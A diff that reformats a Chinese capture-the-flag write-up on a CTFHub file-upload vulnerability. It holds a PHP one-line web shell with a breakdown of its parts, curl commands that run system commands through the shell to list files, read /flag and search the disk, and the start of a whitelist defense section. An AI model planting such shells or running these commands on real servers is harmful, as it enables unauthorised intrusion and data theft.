@@ -88,27 +88,28 @@ ctfhub{d20b0bfa77e476850d4dfab0}
 
 ## 知识点总结
 1. 文件上传漏洞核心要点
-|知识点|说明|
+   
+| 知识点 | 说明 |
 | :--- | :--- |
-|上传点|表单上传 接口上传|
-|解析点|Web 服务器解析 PHP 脚本|
-|利用链|上传木马 → 访问解析 → 执行命令|
+| 上传点 | 表单上传、接口上传 |
+| 解析点 | Web 服务器解析 PHP 脚本 |
+| 利用链 | 上传木马 → 访问解析 → 执行命令 |
 
 2. WebShell
 php
 <?php @eval($_POST['cmd']); ?>
-|部分|作用|
+| 部分 | 作用 |
 | :--- | :--- |
-|@|抑制报错，防止暴露路径|
-|eval|执行传入的 PHP 代码|
-|$_POST['cmd']|获取 POST 请求里的 cmd 参数|
+| @|抑制报错，防止暴露路径 |
+| eval |执行传入的 PHP 代码 |
+| $_POST['cmd'] | 获取 POST 请求里的 cmd 参数 |
 
-curl 命令
-|命令|说明|
+3. curl 命令
+| 命令 | 说明 |
 | :--- | :--- |
-|curl -X POST URL -d "cmd=system('ls');"|执行 ls|
-|curl -X POST URL -d "cmd=system('cat /flag');"|读取 flag|
-|curl -X POST URL -d "cmd=system('find / -name *flag* 2>/dev/null');"|全盘搜索 flag|
+| curl -X POST URL -d "cmd=system('ls');" | 执行 ls |
+| curl -X POST URL -d "cmd=system('cat /flag');" | 读取 flag |
+| curl -X POST URL -d "cmd=system('find / -name *flag* 2>/dev/null');" | 全盘搜索 flag |
 
 ## 防御建议
 白名单校验：只允许 .jpg、.png 等安全后缀。
